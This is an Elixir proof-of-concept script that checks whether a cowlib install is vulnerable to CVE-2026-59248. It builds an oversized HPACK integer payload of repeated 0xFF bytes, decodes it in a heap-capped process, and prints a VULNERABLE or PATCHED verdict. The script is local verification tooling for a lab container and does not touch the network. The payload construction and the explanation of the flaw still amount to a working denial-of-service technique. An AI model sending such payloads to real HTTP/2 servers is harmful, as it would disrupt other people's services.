# server/poc.exs
#
# Library-level surface test for CVE-2026-59248 (HPACK oversized-integer DoS
# in cowlib < 2.19.0).
#
# Builds an `0xFF`-prefixed HPACK integer (0xFF × N + 0x00) and feeds it to
# :cow_hpack.decode/2 inside a process whose heap is capped. Under cowlib
# < 2.19.0, dec_big_int/3 walks every continuation octet, materialising
# O(n²) bignums, so the child either exceeds max_heap_size (killed) or only
# fails at the end when the huge header-table index is looked up. Under
# >= 2.19.0 the `when M < 32` guard stops the recursion after 5 octets.
#
# Run inside the image (does not bind any port):
#   docker compose run --rm cowboy-server mix run poc.exs
#   docker compose exec cowboy-server mix run poc.exs   # next to the server
#
# Environment:
#   PAYLOAD_CONTINUATIONS  default 100000    number of 0xFF octets
#   HEAP_WORDS             default 1000000   child heap cap, in words (8 B each)
#   SAMPLE_MS              default 50        heap/memory sampling interval
#   LOG_EVERY              default 5         log every Nth sample (1 = all)
#   TIMEOUT_MS             default 30000     hard cap on the decode
#   VERBOSE                default 1         0 summary, 1 sampled, 2 every sample
#
# Notes:
#   max_heap_size is checked when a GC starts, so a small cap (e.g.
#   HEAP_WORDS=50000) kills the child within a few ms with :killed. A large
#   cap lets the decode run to the end, where the huge header-table index
#   fails in :lists.nth/2. Both outcomes demonstrate the vulnerability;
#   the large cap is the one that produces a readable progress log.

defmodule PoC do
  @default_continuations 100_000
  @default_heap_words 1_000_000

  def run do
    opts = %{
      continuations: positive_env("PAYLOAD_CONTINUATIONS", @default_continuations),
      heap_words: positive_env("HEAP_WORDS", @default_heap_words),
      sample_ms: positive_env("SAMPLE_MS", 50),
      log_every: positive_env("LOG_EVERY", 5),
      timeout_ms: positive_env("TIMEOUT_MS", 30_000),
      verbose: env_int("VERBOSE", 1)
    }

    vsn = cowlib_vsn()

    log("cowlib #{vsn} — HPACK oversized-integer decoder test")
    log(
      "config: continuations=#{opts.continuations} heap_words=#{opts.heap_words} " <>
        "(#{human(opts.heap_words * 8)} cap) sample=#{opts.sample_ms}ms " <>
        "timeout=#{opts.timeout_ms}ms verbose=#{opts.verbose}"
    )

    payload = :binary.copy(<<0xFF>>, opts.continuations) <> <<0x00>>
    log("payload: #{byte_size(payload)} bytes (#{opts.continuations} 0xFF octets + 0x00)")

    vm0 = :erlang.memory(:total)
    cg0 = cgroup_current()
    log("baseline: vm_total=#{human(vm0)}#{cgroup_suffix(cg0)}")

    state = :cow_hpack.init()
    log("hpack state initialised; spawning decoder")

    started = System.monotonic_time(:millisecond)

    {pid, ref} =
      spawn_monitor(fn ->
        Process.flag(:max_heap_size, %{
          size: opts.heap_words,
          kill: true,
          error_logger: false
        })

        try do
          :cow_hpack.decode(payload, state)
        catch
          kind, reason ->
            # Never carry the oversized integer into the exit reason: the
            # stacktrace arguments can be megabytes wide.
            exit({:raised, kind, brief(reason), top_frame(__STACKTRACE__)})
        end
      end)

    log("decoder pid=#{inspect(pid)} started")

    {elapsed, reason, last} = await(pid, ref, started, opts)

    vm1 = :erlang.memory(:total)
    cg1 = cgroup_current()

    log("decoder down after #{elapsed}ms: #{describe(reason)}")

    if last do
      log(
        "last sample: heap=#{last.total_heap_size}w " <>
          "mem=#{human(last.memory)} reductions=#{last.reductions}"
      )
    end

    log("after: vm_total=#{human(vm1)} (#{signed(vm1 - vm0)})#{cgroup_suffix(cg1)}")

    {label, detail} = verdict(reason)
    log("VERDICT: #{label} — #{detail}")
  end

  # --- sampling -------------------------------------------------------------

  defp await(pid, ref, started, opts), do: loop(pid, ref, started, opts, 0, nil)

  defp loop(pid, ref, started, opts, n, last) do
    elapsed = System.monotonic_time(:millisecond) - started

    if elapsed >= opts.timeout_ms do
      log("timeout after #{elapsed}ms — killing decoder")
      Process.exit(pid, :kill)
      {elapsed, :timeout, last}
    else
      receive do
        {:DOWN, ^ref, :process, ^pid, reason} ->
          {System.monotonic_time(:millisecond) - started, reason, last}
      after
        min(opts.sample_ms, opts.timeout_ms - elapsed) ->
          case sample(pid) do
            nil ->
              loop(pid, ref, started, opts, n + 1, last)

            s ->
              if log_sample?(opts, n) do
                log(
                  "t+#{elapsed}ms heap=#{s.total_heap_size}w " <>
                    "mem=#{human(s.memory)} reductions=#{s.reductions}"
                )
              end

              loop(pid, ref, started, opts, n + 1, s)
          end
      end
    end
  end

  defp log_sample?(opts, n) do
    cond do
      opts.verbose >= 2 -> true
      opts.verbose == 0 -> false
      n == 0 -> true
      true -> rem(n, opts.log_every) == 0
    end
  end

  defp sample(pid) do
    case Process.info(pid, [:memory, :total_heap_size, :reductions]) do
      nil ->
        nil

      info ->
        %{
          memory: info[:memory] || 0,
          total_heap_size: info[:total_heap_size] || 0,
          reductions: info[:reductions] || 0
        }
    end
  end

  # --- verdicts -------------------------------------------------------------

  defp verdict(:killed) do
    {:VULNERABLE,
     "VM killed the decoder (:killed) — max_heap_size exceeded while shifting the integer"}
  end

  defp verdict({:max_heap_size_exceeded, _}) do
    {:VULNERABLE, "decoder exceeded max_heap_size — unbounded integer growth"}
  end

  defp verdict({:raised, :error, :function_clause, frame}) do
    if String.contains?(frame, "dec_big_int") do
      {:PATCHED,
       "M < 32 guard rejected the oversized integer after a few octets; no O(n²) work"}
    else
      {:VULNERABLE,
       "decoder walked the full O(n²) shift chain, then failed at #{frame} on the huge index"}
    end
  end

  defp verdict({:raised, kind, reason, frame}) do
    {:INCONCLUSIVE, "decoder raised #{kind} #{inspect(reason)} at #{frame}"}
  end

  defp verdict(:normal) do
    {:INCONCLUSIVE,
     "decode returned normally — payload too small to show the effect; raise PAYLOAD_CONTINUATIONS"}
  end

  defp verdict(:timeout) do
    {:INCONCLUSIVE, "decode did not finish within TIMEOUT_MS; raise it for larger payloads"}
  end

  defp verdict(other) do
    {:INCONCLUSIVE, "decoder exited with #{inspect(other, limit: 5)}"}
  end

  # --- error summarisation --------------------------------------------------

  defp describe(:killed), do: "killed (max_heap_size exceeded)"
  defp describe({:raised, kind, reason, frame}), do: "#{kind} #{inspect(reason)} at #{frame}"
  defp describe(other), do: inspect(other, limit: 5, printable_limit: 120)

  defp brief(reason) when is_atom(reason), do: reason

  defp brief(reason) do
    text = inspect(reason, limit: 5, printable_limit: 120)

    if byte_size(text) > 200, do: binary_part(text, 0, 200) <> "...", else: text
  end

  defp top_frame([{mod, fun, arity, _loc} | _]) when is_integer(arity),
    do: "#{inspect(mod)}.#{fun}/#{arity}"

  defp top_frame([{mod, fun, args, _loc} | _]) when is_list(args),
    do: "#{inspect(mod)}.#{fun}/#{length(args)}"

  defp top_frame(_), do: "unknown"

  # --- helpers --------------------------------------------------------------

  defp cowlib_vsn do
    case Application.spec(:cowlib, :vsn) do
      nil -> "unknown"
      vsn -> to_string(vsn)
    end
  end

  defp cgroup_current do
    with {:ok, raw} <- File.read("/sys/fs/cgroup/memory.current"),
         {n, _} <- Integer.parse(String.trim(raw)) do
      n
    else
      _ -> nil
    end
  end

  defp cgroup_suffix(nil), do: ""
  defp cgroup_suffix(n), do: " cgroup=#{human(n)}"

  defp positive_env(name, default) do
    case env_int(name, default) do
      n when is_integer(n) and n > 0 -> n
      _ -> default
    end
  end

  defp env_int(name, default) do
    case System.get_env(name) do
      nil ->
        default

      value ->
        case Integer.parse(String.trim(value)) do
          {n, _} when n >= 0 -> n
          _ -> default
        end
    end
  end

  defp human(n) when n >= 1_048_576, do: "#{Float.round(n / 1_048_576, 1)}MiB"
  defp human(n) when n >= 1_024, do: "#{Float.round(n / 1_024, 1)}KiB"
  defp human(n), do: "#{n}B"

  defp signed(n) when n >= 0, do: "+" <> human(n)
  defp signed(n), do: "-" <> human(-n)

  defp log(message), do: IO.puts("#{timestamp()} [poc] #{message}")

  defp timestamp do
    ms = :os.system_time(:millisecond)
    {{_, _, _}, {h, m, s}} = :calendar.system_time_to_local_time(ms, :millisecond)

    :io_lib.format("~2..0B:~2..0B:~2..0B.~3..0B", [h, m, s, rem(ms, 1000)])
    |> IO.iodata_to_binary()
  end
end

PoC.run()
